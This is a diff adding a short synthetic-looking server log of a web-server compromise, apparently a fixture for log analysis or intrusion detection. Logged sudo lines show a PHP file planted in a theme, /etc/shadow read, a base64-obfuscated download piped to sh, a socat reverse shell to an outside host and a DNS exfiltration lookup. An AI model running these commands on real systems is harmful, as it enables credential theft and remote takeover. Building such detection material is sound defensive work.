@@ -1,0 +1,11 @@
+Jun 22 10:01:00 web01 sshd[1024]: Accepted publickey for admin from 192.168.100.50 port 55000 ssh2: RSA SHA256:...
+Jun 22 10:05:15 web01 sudo:     www-data : TTY=unknown ; PWD=/var/www/html ; USER=root ; COMMAND=/usr/bin/wp plugin update --all --path=/var/www/html
+Jun 22 10:05:25 web01 sudo:     www-data : TTY=unknown ; PWD=/var/www/html ; USER=root ; COMMAND=/bin/mv /tmp/phpabc123 /var/www/html/wp-content/themes/evil-theme/index.php
+Jun 22 10:06:00 web01 sudo:     www-data : TTY=unknown ; PWD=/var/www/html ; USER=root ; COMMAND=/usr/bin/whoami
+Jun 22 10:06:05 web01 sudo:     www-data : TTY=unknown ; PWD=/var/www/html ; USER=root ; COMMAND=/bin/cat /etc/shadow
+Jun 22 10:10:00 web01 sudo:     www-data : TTY=unknown ; PWD=/var/www/html ; USER=root ; COMMAND=/bin/bash -c echo 'd2dldCBodHRwOi8vMTk4LjUxLjEwMC43Ny9jYS5wZW0gLU8gL3RtcC9jYS5wZW0=' | base64 -d | sh
+Jun 22 10:15:00 web01 sudo:     www-data : TTY=unknown ; PWD=/var/www/html ; USER=root ; COMMAND=/usr/bin/curl -s http://198.51.100.77/ca.pem -o /tmp/ca.pem
+Jun 22 10:20:00 web01 CRON[2000]: (root) CMD (   /usr/local/bin/backup.sh)
+Jun 22 10:30:00 web01 sudo:     www-data : TTY=unknown ; PWD=/var/www/html ; USER=root ; COMMAND=/usr/bin/socat OPENSSL:203.0.113.55:443,cert=/tmp/ca.pem,verify=0 EXEC:/bin/bash,pty,stderr,setsid
+Jun 22 10:45:00 web01 kernel: [7620.000] Out of memory: Kill process 1234 (httpd) score 900 or sacrifice child
+Jun 22 11:10:00 web01 sudo:     www-data : TTY=unknown ; PWD=/var/www/html ; USER=root ; COMMAND=/usr/bin/nslookup exfil.evil.org 8.8.8.8
